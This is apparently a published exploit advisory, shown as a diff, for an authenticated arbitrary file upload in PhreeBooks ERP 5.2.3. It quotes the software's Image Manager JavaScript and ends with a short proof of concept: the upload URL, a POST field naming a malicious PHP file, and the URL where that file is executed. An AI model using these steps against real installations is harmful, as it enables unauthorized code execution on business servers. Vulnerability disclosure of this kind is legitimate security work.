@@ -1,0 +1,85 @@
+PhreeBooks ERP v5.2.3 - Arbitrary File Upload
+
+# Date: 03.04.2019
+# Exploit Author: Abdullah Çelebi
+# Vendor Homepage: https://www.phreesoft.com/
+# Software Link: https://sourceforge.net/projects/phreebooks/files/latest/download
+# Category: Webapps
+# Version: 5.2.3
+# Tested on: WAMPP @Win
+# Software description:
+PhreeBooks 5 is a completely new web based application that utilizes the
+redesigned Bizuno ERP library from PhreeSoft. Bizuno supports PHP 7 along
+with all the latest versions of mySQL. Additionally, Bizuno utilizes the
+jQuery EasyUI graphical interface and will be also enhanced for mobile
+devices and tablets.
+
+# Vulnerabilities:
+# An attacker could run a remote code after an authorized user login using
+the parameter.
+
+# Code Section @Tools>Image Manager
+
+//
+<script type="text/javascript">
+
+function imgAction(action) { jq('#imgAction').val(action); imgRefresh(); }
+function imgClickImg(strImage) {
+    var lastChar = strImage.substr(strImage.length - 1);
+    if (lastChar == '/') {
+        jq('#imgMgrPath').val(jq('#imgMgrPath').val()+'/'+strImage);
+        jq('#imgAction').val('refresh');
+        imgRefresh();
+    } else if (jq('#imgTarget').val()) {
+        var target = jq('#imgTarget').val();
+        var path   = jq('#imgMgrPath').val();
+        var fullPath= path ? path+'/'+strImage : strImage;
+        jq('#imgTarget').val(fullPath);
+        jq('#'+target).val(fullPath);
+        jq('#img_'+target).attr('src',
+bizunoAjaxFS+'&src=0/images/'+fullPath);
+        bizWindowClose('winImgMgr');
+    }
+}
+function imgRefresh() {
+    var target = jq('#imgTarget').val();
+    var path   = jq('#imgMgrPath').val();
+    var search = jq('#imgSearch').val();
+    var action = jq('#imgAction').val();
+    var shref  =
+'index.php?&p=bizuno/image/manager&imgTarget='+target+'&imgMgrPath='+path+'&imgSearch='+search+'&imgAction=';
+    if (action == 'upload') {
+        jq('#frmImgMgr').submit(function (e) {
+            jq.ajax({
+                url:        shref+'upload',
+                type:       'post',
+                data:       new FormData(this),
+                mimeType:   'multipart/form-data',
+                contentType:false,
+                cache:      false,
+                processData:false,
+                success:    function (data) { processJson(data);
+jq('#winImgMgr').window('refresh',shref+'refresh'); }
+            });
+            e.preventDefault();
+        });
+        jq('#frmImgMgr').submit();
+    } else {
+        jq('#winImgMgr').window('refresh', shref+action);
+    }
+}
+jq('#winImgMgr').window({'title':'Image Manager: /'});
+</script>
+
+
+
+# POC - RCE via Arbitrary File Upload :
+
+Process during upload malicious file;
+http://localhost/PhreeBooksERP/index.php?&p=bizuno/image/manager&imgTarget=&imgMgrPath=&imgSearch=&imgAction=upload
+
+Post section details;
+imgSearch=&imgFile=evilcode_key.php
+
+Result;
+http://localhost/PhreeBooksERP/bizunoFS.php?&src=0/images/evilcode_key.php
